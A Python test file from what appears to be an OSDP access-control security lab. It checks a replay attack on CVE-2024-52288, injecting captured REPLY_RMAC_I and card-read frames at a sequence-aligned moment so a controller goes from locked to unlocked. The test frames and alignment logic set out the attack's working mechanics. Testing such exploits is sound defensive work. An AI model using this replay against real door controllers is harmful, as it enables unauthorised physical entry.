"""Host proof of ATK-05b CVE-2024-52288 Secure Channel replay (no Docker).

Covers the pure ``run_cve_replay`` verdict, mirroring ``test_attacks_replay``'s coverage of
``run_replay``:

- the recorded secure pd->cp frames (the handshake ``REPLY_RMAC_I`` desync primitive, then the
  secure card-read reply) are injected byte-for-byte, in order - never hand-built or mutated;
- a ``HIGH`` Finding is emitted only on an observed locked->unlocked transition;
- an empty recording performs no injection and returns ``[]`` (the flagged true negative);
- an already-unlocked baseline is inconclusive and never claimed as a success;
- an injection with no observed effect (the fixed v3.0.8 CP rejecting the out-of-state RMAC_I)
  returns ``[]`` - the matched-pair failure.
"""

from __future__ import annotations

from interlock.osdp import codec, constants, framer
from interlock.osdp.attacks.replay import cve_replay_transform, run_cve_replay
from interlock.osdp.codec import OsdpFrame
from interlock.osdp.transport import Direction

_PD_ADDRESS = 101


def _rmac_i_frame() -> bytes:
    """Return an encoded pd->cp REPLY_RMAC_I - the CVE-2024-52288 desync primitive to replay."""
    frame = OsdpFrame(
        had_mark=True,
        address=_PD_ADDRESS | constants.ADDR_REPLY_FLAG,
        control=constants.PKT_CONTROL_CRC | constants.PKT_CONTROL_SCB | 0x01,
        scb=bytes([0x02, constants.SCS_14]),
        code=constants.REPLY_RMAC_I,
        data=bytes(16),
        use_crc=True,
    )
    return codec.encode(frame)


def _secure_reply(code: int = constants.REPLY_RAW) -> bytes:
    """Return an encoded pd->cp secure reply (the card-read reply the controller unlocks on)."""
    frame = OsdpFrame(
        had_mark=True,
        address=_PD_ADDRESS | constants.ADDR_REPLY_FLAG,
        control=constants.PKT_CONTROL_CRC | constants.PKT_CONTROL_SCB | 0x01,
        scb=bytes([0x02, constants.SCS_18]),
        code=code,
        data=b"\x00\x01\x02\x03",
        use_crc=True,
    )
    return codec.encode(frame)


def test_run_cve_replay_flags_a_locked_to_unlocked_transition() -> None:
    injected: list[bytes] = []
    state = {"unlocked": False}
    recorded = [_rmac_i_frame(), _secure_reply()]

    def inject(frame_bytes: bytes) -> None:
        injected.append(frame_bytes)
        state["unlocked"] = True

    findings = run_cve_replay(recorded, inject, lambda: state["unlocked"])

    assert injected == list(recorded), (
        "the recorded secure frames must be replayed byte-for-byte, in order (RMAC_I desync first)"
    )
    assert len(findings) == 1
    assert findings[0].id == "ATK-05b-cve-2024-52288-rmac-replay"
    assert findings[0].severity.value == "high"
    assert "CVE-2024-52288" in findings[0].title


def test_run_cve_replay_replays_the_rmac_i_desync_first() -> None:
    """The first replayed frame is the REPLY_RMAC_I (0x78) that rewinds the CP's r_mac."""
    injected: list[bytes] = []
    recorded = [_rmac_i_frame(), _secure_reply()]

    run_cve_replay(recorded, injected.append, lambda: False)

    assert codec.decode(injected[0]).code == constants.REPLY_RMAC_I
    assert injected == list(recorded)


def test_run_cve_replay_empty_recording_performs_no_injection_and_returns_empty() -> None:
    calls: list[bytes] = []
    findings = run_cve_replay([], calls.append, lambda: False)
    assert findings == []
    assert calls == [], "an empty recording must never call inject"


def test_run_cve_replay_is_inconclusive_when_baseline_already_unlocked() -> None:
    calls: list[bytes] = []
    findings = run_cve_replay([_rmac_i_frame()], calls.append, lambda: True)
    assert findings == []
    assert calls == [], "inject must never run when the baseline is already unlocked"


def test_run_cve_replay_returns_empty_when_injection_has_no_effect() -> None:
    """The fixed v3.0.8 CP: the out-of-state RMAC_I is rejected, so the probe never transitions."""
    findings = run_cve_replay([_rmac_i_frame()], lambda frame: None, lambda: False)
    assert findings == []


# --------------------------------------------------------------------------------------
# cve_replay_transform: the sequence-aligned, REPLY_RMAC_I-first in-band replay seam
# --------------------------------------------------------------------------------------


def _pd_frame(
    code: int, scs: int, seq: int, data: bytes = b"\x00\x01\x02\x03"
) -> bytes:
    """Return an encoded secure pd->cp frame with a chosen code, SCS and 2-bit sequence.

    The 2-bit sequence lives in the clear control byte (``control & PKT_CONTROL_SQN``), the
    exact signal an inline attacker reads to align the replay - no lab-internal state.
    """
    frame = OsdpFrame(
        had_mark=True,
        address=_PD_ADDRESS | constants.ADDR_REPLY_FLAG,
        control=(
            constants.PKT_CONTROL_CRC
            | constants.PKT_CONTROL_SCB
            | (seq & constants.PKT_CONTROL_SQN)
        ),
        scb=bytes([0x02, scs]),
        code=code,
        data=data,
        use_crc=True,
    )
    return codec.encode(frame)


def test_cve_transform_injects_once_at_sequence_alignment() -> None:
    """Once armed, the blob is injected exactly at the aligned moment, REPLY_RMAC_I first.

    The captured REPLY_RMAC_I carries sequence 1, so the CP's next command equals 1 only right
    after a genuine pd->cp frame whose sequence is 3 (the predecessor of 1). The card-read reply
    carries sequence 3, so the one-shot blob is injected right after it - not before.
    """
    transform = cve_replay_transform(armed=lambda: True)
    rmac = _pd_frame(constants.REPLY_RMAC_I, constants.SCS_14, seq=1, data=bytes(16))
    ack = _pd_frame(constants.REPLY_ACK, constants.SCS_16, seq=2)
    raw = _pd_frame(constants.REPLY_RAW, constants.SCS_18, seq=3)

    out_rmac = transform(Direction.pd_to_cp, rmac)
    out_ack = transform(Direction.pd_to_cp, ack)
    out_raw = transform(Direction.pd_to_cp, raw)

    # Until the aligning sequence is reached, genuine frames forward unchanged (no early inject).
    assert out_rmac == rmac
    assert out_ack == ack

    # The card-read reply's sequence (3) means the CP's next command (1) equals the captured
    # REPLY_RMAC_I's sequence (1): the blob is injected here, right after the genuine frame.
    assert len(out_raw) > len(raw)
    injected = list(framer.iter_frames(out_raw[len(raw) :]))
    assert codec.decode(injected[0]).code == constants.REPLY_RMAC_I
    assert [codec.decode(f).code for f in injected] == [
        constants.REPLY_RMAC_I,
        constants.REPLY_ACK,
        constants.REPLY_RAW,
    ]

    # One-shot: a further aligning frame must NOT inject a second time.
    ack3 = _pd_frame(constants.REPLY_ACK, constants.SCS_16, seq=3)
    out_again = transform(Direction.pd_to_cp, ack3)
    assert out_again == ack3


def test_cve_transform_never_injects_without_sequence_alignment() -> None:
    """When no observed sequence implies the captured frame's sequence, nothing is injected."""
    transform = cve_replay_transform(armed=lambda: True)
    frames = [
        # first_seq = 1, so alignment needs an observed sequence of 3 - never fed below.
        _pd_frame(constants.REPLY_RMAC_I, constants.SCS_14, seq=1, data=bytes(16)),
        _pd_frame(constants.REPLY_RAW, constants.SCS_18, seq=2),  # seals; next(2)=3 != 1
        _pd_frame(constants.REPLY_ACK, constants.SCS_16, seq=1),  # next(1)=2 != 1
        _pd_frame(constants.REPLY_ACK, constants.SCS_16, seq=2),  # next(2)=3 != 1
    ]
    outputs = [transform(Direction.pd_to_cp, raw) for raw in frames]
    assert outputs == frames, "nothing may be injected when the aligning sequence never occurs"


def test_cve_transform_capture_resets_at_each_handshake() -> None:
    """The blob restarts at the latest REPLY_RMAC_I, never spanning two handshakes."""
    transform = cve_replay_transform(armed=lambda: True)

    # First handshake + card read - must be discarded by the reset at the next RMAC_I.
    transform(
        Direction.pd_to_cp,
        _pd_frame(constants.REPLY_RMAC_I, constants.SCS_14, seq=1, data=bytes([0xA0] * 16)),
    )
    transform(
        Direction.pd_to_cp,
        _pd_frame(constants.REPLY_RAW, constants.SCS_18, seq=2, data=b"\xa0\xa1"),
    )

    # Second handshake: the blob must restart here.
    second_rmac = _pd_frame(
        constants.REPLY_RMAC_I, constants.SCS_14, seq=1, data=bytes([0xB0] * 16)
    )
    transform(Direction.pd_to_cp, second_rmac)
    second_raw = _pd_frame(constants.REPLY_RAW, constants.SCS_18, seq=3, data=b"\xb0\xb1")
    out = transform(Direction.pd_to_cp, second_raw)

    injected = list(framer.iter_frames(out[len(second_raw) :]))
    assert len(injected) == 2, "the blob must be bounded to the latest handshake's frames"
    assert injected[0] == second_rmac, "the blob must start at the latest REPLY_RMAC_I"
    assert codec.decode(injected[1]).code == constants.REPLY_RAW
